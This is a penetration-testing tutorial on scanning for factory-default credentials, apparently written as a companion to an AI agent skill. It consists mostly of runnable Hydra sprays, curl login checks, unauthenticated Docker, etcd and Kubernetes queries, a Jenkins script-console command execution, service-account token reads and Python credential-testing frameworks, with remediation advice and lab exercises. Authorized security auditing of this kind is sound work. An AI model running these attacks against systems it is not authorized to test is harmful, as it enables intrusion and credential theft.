# Default Credential Scanning Guide

> Companion to `skills/security-misconfiguration/SKILL.md`. This guide covers default password databases, service fingerprinting, automated credential testing, and systematic approaches to identifying systems running with factory-default authentication.

---

## 1. Default Credential Databases

Maintain and query comprehensive default credential databases for rapid testing:

```bash
# SecLists default credentials (organized by vendor/product)
ls /usr/share/seclists/Passwords/Default-Credentials/
# Contains: ftp-betterdefaultpasslist.txt, ssh-betterdefaultpasslist.txt,
# default-passwords.csv, tomcat-betterdefaultpasslist.txt, etc.

# Query the CSV database for a specific product
grep -i "tomcat" /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
# Output: Apache Tomcat,tomcat,tomcat
# Output: Apache Tomcat,admin,admin
# Output: Apache Tomcat,manager,manager

# CIRT.net default password database (comprehensive)
curl -s "https://cirt.net/passwords?criteria=cisco" | \
  grep -oP 'Password:</b>\s*\K[^<]+' | head -20

# Build a custom database from multiple sources
cat > default_creds_db.json << 'EOF'
{
  "services": {
    "ssh": [
      {"user": "root", "pass": "root"},
      {"user": "admin", "pass": "admin"},
      {"user": "pi", "pass": "raspberry"},
      {"user": "ubnt", "pass": "ubnt"}
    ],
    "mysql": [
      {"user": "root", "pass": ""},
      {"user": "root", "pass": "root"},
      {"user": "root", "pass": "mysql"},
      {"user": "dbadmin", "pass": "dbadmin"}
    ],
    "postgresql": [
      {"user": "postgres", "pass": "postgres"},
      {"user": "admin", "pass": "admin"}
    ],
    "mongodb": [
      {"user": "", "pass": "", "note": "no auth by default"},
      {"user": "admin", "pass": "admin"}
    ]
  }
}
EOF
```

---

## 2. Service Fingerprinting for Credential Selection

Identify services accurately before attempting default credentials:

```bash
# Nmap service version detection with default script scanning
nmap -sV -sC -p 21,22,23,80,443,3306,5432,6379,8080,8443,27017 \
  --script=banner \
  -oA service_scan target_network/24

# Extract identified services for credential testing
grep -E "open.*http|open.*ssh|open.*ftp|open.*mysql|open.*postgres" \
  service_scan.gnmap | \
  awk '{print $2, $0}' | sort > identified_services.txt

# Detailed HTTP fingerprinting for web admin panels
httpx -l targets.txt -title -tech-detect -status-code -json | \
  jq 'select(.title | test("login|admin|dashboard|console"; "i"))' > \
  admin_panels.json

# Identify specific products from HTTP headers and responses
curl -sI "http://target:8080/" | grep -iE "server:|x-powered-by:|www-authenticate:"
# Server: Apache-Coyote/1.1  → Tomcat
# X-Powered-By: Express      → Node.js
# WWW-Authenticate: Basic realm="Grafana" → Grafana
```

---

## 3. Automated Credential Testing with Hydra

Use Hydra for systematic default credential testing across network services:

```bash
# SSH default credential spray
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt \
  -M ssh_targets.txt ssh -t 4 -o ssh_results.txt

# FTP default credentials
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  target.com ftp -o ftp_results.txt

# Web form authentication (Tomcat manager)
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
  target.com http-get "/manager/html" -o tomcat_results.txt

# MySQL default credentials
hydra -l root -P /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt \
  target.com mysql -t 4 -o mysql_results.txt

# Multiple services in parallel across a network
hydra -C default_creds.txt -M targets.txt ssh -t 2 -w 5 -o results.txt
```

---

## 4. Web Application Default Credentials

Test web admin panels and management interfaces:

```bash
# Common web application defaults to test
# Format: product | URL path | username | password

# Tomcat Manager
curl -u "tomcat:tomcat" -s -o /dev/null -w "%{http_code}" \
  "http://target:8080/manager/html"

# Jenkins (no auth or admin:admin)
curl -s -o /dev/null -w "%{http_code}" \
  "http://target:8080/script"

# Grafana
curl -s -X POST "http://target:3000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","password":"admin"}' | jq '.message'

# phpMyAdmin
curl -s -X POST "http://target/phpmyadmin/" \
  -d "pma_username=root&pma_password=&server=1" \
  -o /dev/null -w "%{http_code}"

# Elasticsearch (no auth by default)
curl -s "http://target:9200/_cluster/health" | jq '.status'

# Redis (no auth by default)
redis-cli -h target INFO server 2>/dev/null | head -5
```

---

## 5. IoT and Network Device Defaults

Network devices and IoT systems frequently ship with well-known credentials:

```bash
# Router/switch default credential testing
# Cisco IOS
hydra -l admin -p cisco target.com ssh -t 1
hydra -l cisco -p cisco target.com ssh -t 1
hydra -l admin -p admin target.com ssh -t 1

# SNMP community string testing (default: public/private)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
  -i targets.txt

# IPMI default credentials (often admin/admin or ADMIN/ADMIN)
nmap -sU -p 623 --script ipmi-brute \
  --script-args userdb=users.txt,passdb=passwords.txt target_network/24

# Telnet default credentials (legacy devices)
hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt \
  target.com telnet -t 2

# Printer default credentials
# HP: admin/(blank), admin/admin
# Xerox: admin/1111
# Brother: admin/access
curl -u "admin:" -s -o /dev/null -w "%{http_code}" "http://printer:80/hp/device/info"
```

---

## 6. Automated Scanning Pipeline

Build a comprehensive default credential scanner that combines fingerprinting with targeted testing:

```python
#!/usr/bin/env python3
"""Default credential scanner — fingerprint services then test known defaults."""

import subprocess
import json
from dataclasses import dataclass
from pathlib import Path

@dataclass(frozen=True)
class DefaultCred:
    service: str
    username: str
    password: str
    port: int

@dataclass(frozen=True)
class ScanResult:
    host: str
    port: int
    service: str
    username: str
    password: str
    status: str

# Default credentials database
KNOWN_DEFAULTS: tuple[DefaultCred, ...] = (
    DefaultCred("tomcat", "tomcat", "tomcat", 8080),
    DefaultCred("tomcat", "admin", "admin", 8080),
    DefaultCred("jenkins", "admin", "admin", 8080),
    DefaultCred("grafana", "admin", "admin", 3000),
    DefaultCred("rabbitmq", "guest", "guest", 15672),
    DefaultCred("mongodb", "admin", "admin", 27017),
    DefaultCred("redis", "", "", 6379),
    DefaultCred("elasticsearch", "", "", 9200),
    DefaultCred("postgres", "postgres", "postgres", 5432),
    DefaultCred("mysql", "root", "", 3306),
)

def fingerprint_service(host: str, port: int) -> str:
    """Identify service running on host:port."""
    result = subprocess.run(
        ["nmap", "-sV", "-p", str(port), "--open", host, "-oG", "-"],
        capture_output=True, text=True, timeout=30
    )
    return result.stdout

def test_credential(host: str, cred: DefaultCred) -> ScanResult:
    """Test a single default credential against a host."""
    # Implementation varies by service type
    if cred.service in ("tomcat", "jenkins", "grafana"):
        return test_http_auth(host, cred)
    elif cred.service in ("mysql", "postgres"):
        return test_db_auth(host, cred)
    return ScanResult(host, cred.port, cred.service, cred.username, cred.password, "skipped")

def test_http_auth(host: str, cred: DefaultCred) -> ScanResult:
    """Test HTTP basic/form authentication."""
    result = subprocess.run(
        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
         "-u", f"{cred.username}:{cred.password}",
         f"http://{host}:{cred.port}/"],
        capture_output=True, text=True, timeout=10
    )
    status = "success" if result.stdout.strip() in ("200", "302") else "failed"
    return ScanResult(host, cred.port, cred.service, cred.username, cred.password, status)
```

---

## 7. Post-Discovery Actions

When default credentials are confirmed, document and escalate properly:

```bash
# Document findings with evidence
echo "[$(date -Iseconds)] DEFAULT CRED FOUND:" >> findings.log
echo "  Host: $TARGET" >> findings.log
echo "  Service: Tomcat Manager" >> findings.log
echo "  Credentials: tomcat:tomcat" >> findings.log
echo "  Evidence: HTTP 200 on /manager/html" >> findings.log
echo "  Risk: Remote Code Execution via WAR deployment" >> findings.log

# Verify access level (do NOT exploit further without authorization)
# For Tomcat — check if WAR deployment is possible
curl -u "tomcat:tomcat" -s "http://target:8080/manager/html" | \
  grep -c "Deploy" && echo "WAR deployment available — RCE possible"

# Generate remediation report
cat << 'EOF' > remediation.md
## Finding: Default Credentials on Production Service

**Affected System**: target.com:8080 (Apache Tomcat 9.0.x)
**Credentials**: tomcat:tomcat (factory default)
**Risk**: CRITICAL — allows remote code execution via WAR deployment

### Remediation Steps:
1. Immediately change all default credentials
2. Implement account lockout after 5 failed attempts
3. Restrict management interfaces to internal network
4. Enable MFA for administrative access
5. Audit all services for default credentials
EOF
```

---

## 8. Preventing False Positives

Validate findings to avoid reporting non-issues:

```bash
# Verify the credential actually grants access (not just a 200 response)
# Some apps return 200 with "login failed" in body
response=$(curl -s -u "admin:admin" "http://target:8080/manager/html")
if echo "$response" | grep -qi "403\|unauthorized\|denied\|invalid"; then
  echo "FALSE POSITIVE: Got 200 but access denied in body"
else
  echo "CONFIRMED: Default credentials grant access"
  echo "$response" | grep -i "manager\|deploy\|admin" | head -5
fi

# Check if the service is a honeypot
# Honeypot indicators: accepts ANY credential, unusual banner, too many open ports
for cred in "admin:admin" "root:root" "test:test" "x:y"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -u "$cred" "http://target:8080/manager/html")
  echo "$cred → $status"
done
# If ALL credentials return 200, likely a honeypot
```

Default credential scanning is one of the highest-ROI activities in penetration testing. Organizations frequently deploy services with factory defaults, especially in development environments that accidentally become production-facing.

---

## 9. Container and Orchestration Default Credentials

Containerized infrastructure introduces new default credential risks:

```bash
# Docker API unauthenticated access (default: no TLS, no auth)
curl -s "http://target:2375/containers/json" | jq '.[].Names'
curl -s "http://target:2375/images/json" | jq '.[].RepoTags'

# Kubernetes dashboard (often deployed without auth)
curl -sk "https://target:8443/api/v1/namespaces/kube-system/pods" | jq '.items[].metadata.name'

# Kubernetes service account token (default: auto-mounted)
# Check if token is accessible from inside a pod:
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# etcd (Kubernetes backing store, default: no auth)
curl -s "http://target:2379/v2/keys/?recursive=true" | jq '.node.nodes[].key'

# Redis in Docker (default: no auth)
docker exec -it redis redis-cli ping
# If PONG returned, no authentication required

# MongoDB in Docker (default: no auth)
docker exec -it mongo mongo --eval "db.adminCommand('listDatabases')"
```

**Container default credential checklist:**

| Service | Default Config | Risk | Remediation |
|---------|---------------|------|-------------|
| Docker daemon | No TLS, no auth on 2375 | RCE via container creation | Enable TLS, use socket proxy |
| Kubernetes dashboard | No auth, ClusterRoleBinding | Full cluster compromise | Enable RBAC, restrict access |
| Redis | No `requirepass` | Data access, config modification | Set strong `requirepass` |
| MongoDB | No `--auth` flag | Full database access | Enable `--auth`, create admin user |
| etcd | No auth on 2379 | All Kubernetes secrets exposed | Enable client cert auth |
| RabbitMQ | guest/guest on 15672 | Queue/message access | Delete guest user, create restricted users |
| PostgreSQL | trust auth in pg_hba.conf | Full database access | Use md5/scram-sha-256 auth |

---

## 10. Credential Testing for Cloud Services

Cloud management consoles and APIs frequently have default or weak credentials:

```bash
# AWS console default access check (should never work in production)
# Test for common access key patterns in public repositories
trufflehog filesystem /path/to/repo --only-verified

# Check for exposed .env files containing cloud credentials
curl -s "https://target.com/.env" | grep -iE "AWS_|AZURE_|GCP_|GOOGLE_"

# Test Kubernetes API server with default service account token
kubectl --server=https://target:6443 --token="$SA_TOKEN" get pods -A

# Check for exposed Grafana default credentials
curl -s -X POST "https://target:3000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","password":"admin"}' | jq '.'

# Jenkins default credential check (script console = RCE)
curl -s -u "admin:admin" "http://target:8080/scriptText" \
  -d 'script=println+"whoami:"+%22whoami%22.execute().text'
```

---

## 11. Building a Credential Testing Framework

For large-scale audits, build a modular framework that can test multiple service types:

```python
#!/usr/bin/env python3
"""Modular credential testing framework for security audits."""

import abc
import requests
import subprocess
from dataclasses import dataclass
from typing import Protocol

@dataclass(frozen=True)
class CredentialResult:
    host: str
    port: int
    service: str
    username: str
    password: str
    status: str  # "success", "failed", "error"
    evidence: str

class CredentialTester(Protocol):
    """Protocol for service-specific credential testers."""
    def test(self, host: str, port: int, username: str, password: str) -> CredentialResult: ...

class HTTPCredentialTester:
    """Tests HTTP Basic/Form authentication."""
    def __init__(self, path: str = "/", method: str = "basic"):
        self.path = path
        self.method = method

    def test(self, host: str, port: int, username: str, password: str) -> CredentialResult:
        url = f"http://{host}:{port}{self.path}"
        try:
            if self.method == "basic":
                resp = requests.get(url, auth=(username, password), timeout=10)
                success = resp.status_code == 200
            else:
                resp = requests.post(url, data={"username": username, "password": password}, timeout=10)
                success = any(ind in resp.text.lower() for ind in ["dashboard", "welcome", "logout"])
            return CredentialResult(
                host=host, port=port, service="http",
                username=username, password=password,
                status="success" if success else "failed",
                evidence=f"HTTP {resp.status_code}"
            )
        except Exception as e:
            return CredentialResult(host=host, port=port, service="http",
                                    username=username, password=password,
                                    status="error", evidence=str(e))

class DBCredentialTester:
    """Tests database authentication."""
    def test(self, host: str, port: int, username: str, password: str) -> CredentialResult:
        try:
            result = subprocess.run(
                ["mysql", "-h", host, "-P", str(port), "-u", username,
                 f"-p{password}", "-e", "SELECT 1", "--batch"],
                capture_output=True, text=True, timeout=10
            )
            success = result.returncode == 0
            return CredentialResult(
                host=host, port=port, service="mysql",
                username=username, password=password,
                status="success" if success else "failed",
                evidence=result.stdout[:200] if success else result.stderr[:200]
            )
        except Exception as e:
            return CredentialResult(host=host, port=port, service="mysql",
                                    username=username, password=password,
                                    status="error", evidence=str(e))
```

---

## Hands-on Exercises

1. **Exercise 1**: Deploy a Docker Compose environment with Tomcat, Jenkins, Grafana, Redis, and MongoDB all using default configurations. Use the scanning techniques from this guide to discover and authenticate to each service. Document the credential pairs that work and the level of access each provides
2. **Exercise 2**: Build a custom default credential database for a specific vendor (choose from: Cisco, HP, Dell, or Netgear). Include at least 30 credential pairs with model-specific variations. Test the database against a lab target
3. **Exercise 3**: Implement the modular credential testing framework from Section 11. Add testers for SSH (using paramiko), FTP (using ftplib), and SNMP (using pysnmp). Run the framework against a multi-service lab environment and generate a comprehensive credential audit report
